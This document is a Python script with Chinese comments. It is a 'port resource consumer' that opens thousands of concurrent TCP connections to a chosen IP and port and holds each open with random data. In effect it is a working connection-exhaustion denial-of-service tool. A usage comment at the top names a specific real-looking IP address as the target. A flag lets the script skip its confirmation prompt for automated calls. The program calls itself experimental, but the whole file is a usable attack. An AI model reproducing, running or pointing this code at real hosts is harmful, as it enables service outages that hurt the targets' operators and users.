#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# python port.py 45.195.69.65 80

import socket
import threading
import time
import random
import argparse
import logging
import sys
from concurrent.futures import ThreadPoolExecutor

# 检查Scapy是否可用
try:
    from scapy.all import IP, TCP, send, sr1, conf
except ImportError:
    print("需要安装Scapy库: pip install scapy")
    sys.exit(1)

# 检查是否在Windows上运行
if sys.platform == "win32":
    try:
        from scapy.arch.windows import get_windows_if_list
        print("检测到Windows系统，请确保已安装Npcap")
    except ImportError:
        print("Windows系统需要安装Npcap: https://npcap.com/")
        sys.exit(1)

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("port_consumer.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
# 确保stdout使用UTF-8编码
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
logger = logging.getLogger(__name__)


class PortResourceConsumer:
    def __init__(self, target_ip, target_port, num_threads=50, connection_timeout=10):
        """
        初始化端口资源消耗器

        Args:
            target_ip: 目标主机IP
            target_port: 目标端口
            num_threads: 并发线程数
            connection_timeout: 连接超时时间（秒）
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.connection_timeout = connection_timeout
        self.active_connections = 0
        self.max_connections = 0
        self.total_connections = 0  # 总连接尝试次数
        self.success_connections = 0  # 成功连接次数
        self.failed_connections = 0  # 失败连接次数
        self.running = False
        self.lock = threading.Lock()

    def create_connection(self, thread_id):
        """创建并保持一个到目标端口的连接"""
        while self.running:
            try:
                # 创建socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.connection_timeout)

                # 尝试连接
                logger.debug(f"线程 {thread_id} 尝试连接到 {self.target_ip}:{self.target_port}")
                s.connect((self.target_ip, self.target_port))

                # 更新活动连接数和统计信息
                with self.lock:
                    self.active_connections += 1
                    self.success_connections += 1
                    if self.active_connections > self.max_connections:
                        self.max_connections = self.active_connections

                logger.debug(f"线程 {thread_id} 成功建立连接，活动连接数: {self.active_connections}")

                # 保持连接一段时间
                keep_alive_time = random.randint(30, 60)
                start_time = time.time()

                while self.running and (time.time() - start_time) < keep_alive_time:
                    try:
                        # 发送一些随机数据保持连接活跃
                        s.send(b"X" * random.randint(1, 100))
                        time.sleep(random.uniform(0.1, 1.0))
                    except Exception as e:
                        logger.debug(f"线程 {thread_id} 发送数据时出错: {e}")
                        break

                # 关闭连接
                s.close()

                # 更新活动连接数
                with self.lock:
                    self.active_connections -= 1

                logger.debug(f"线程 {thread_id} 关闭连接，活动连接数: {self.active_connections}")

                # 等待随机时间后重试
                time.sleep(random.uniform(0.1, 1.0))

            except socket.timeout:
                with self.lock:
                    self.failed_connections += 1
                logger.debug(f"线程 {thread_id} 连接超时")
                time.sleep(random.uniform(0.5, 2.0))
            except ConnectionRefusedError:
                with self.lock:
                    self.failed_connections += 1
                logger.debug(f"线程 {thread_id} 连接被拒绝")
                time.sleep(random.uniform(0.5, 2.0))
            except Exception as e:
                with self.lock:
                    self.failed_connections += 1
                logger.error(f"线程 {thread_id} 发生错误: {e}")
                time.sleep(random.uniform(0.5, 2.0))

    def report_status(self):
        """定期报告状态的线程"""
        last_success = 0
        start_time = time.time()

        while self.running:
            time.sleep(10)  # 每10秒报告一次

            if self.running:  # 再次检查，避免停止后还输出
                with self.lock:
                    current_success = self.success_connections
                    delta_success = current_success - last_success
                    last_success = current_success

                    elapsed_time = int(time.time() - start_time)
                    minutes = elapsed_time // 60
                    seconds = elapsed_time % 60

                logger.info(
                    f"[统计] 运行时间: {minutes}分{seconds}秒 | "
                    f"当前活动连接: {self.active_connections} | "
                    f"峰值连接数: {self.max_connections} | "
                    f"累计成功: {current_success} | "
                    f"最近10秒新增: {delta_success} | "
                    f"累计失败: {self.failed_connections}"
                )

    def start(self):
        """启动端口资源消耗"""
        logger.info(f"开始对 {self.target_ip}:{self.target_port} 进行端口资源消耗")
        logger.info(f"使用 {self.num_threads} 个线程，每10秒输出一次统计信息")
        self.running = True

        # 启动状态报告线程
        status_thread = threading.Thread(target=self.report_status, daemon=True)
        status_thread.start()

        # 使用线程池创建多个连接
        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            for i in range(self.num_threads):
                executor.submit(self.create_connection, i)

    def stop(self):
        """停止端口资源消耗"""
        logger.info("停止端口资源消耗")
        self.running = False


def signal_handler(signum, frame):
    """处理信号"""
    logger.info(f"接收到信号 {signum}，正在停止...")
    if consumer:
        consumer.stop()
    sys.exit(0)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="实验环境端口资源消耗程序")
    parser.add_argument("target_ip", help="目标主机IP地址")
    parser.add_argument("target_port", type=int, help="目标端口号")
    parser.add_argument("-t", "--threads", type=int, default=10000,
                        help="并发线程数 (默认: 10000)")
    parser.add_argument("-d", "--debug", action="store_true",
                        help="启用调试模式")
    parser.add_argument("-y", "--yes", action="store_true",
                        help="自动确认，跳过交互式确认（用于API调用）")

    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)

    # 显示警告信息
    logger.warning(f"将对 {args.target_ip}:{args.target_port} 进行端口资源消耗")

    # 确认操作（除非使用-y参数）
    if not args.yes:
        response = input("确认继续? (y/N): ")
        if response.lower() != 'y':
            logger.info("操作已取消")
            sys.exit(0)

    consumer = PortResourceConsumer(
        target_ip=args.target_ip,
        target_port=args.target_port,
        num_threads=args.threads
    )

    try:
        # 启动端口资源消耗
        consumer.start()
    except KeyboardInterrupt:
        logger.info("接收到中断信号，停止程序")
        consumer.stop()
    except Exception as e:
        logger.error(f"程序运行出错: {e}")
        consumer.stop()
        sys.exit(1)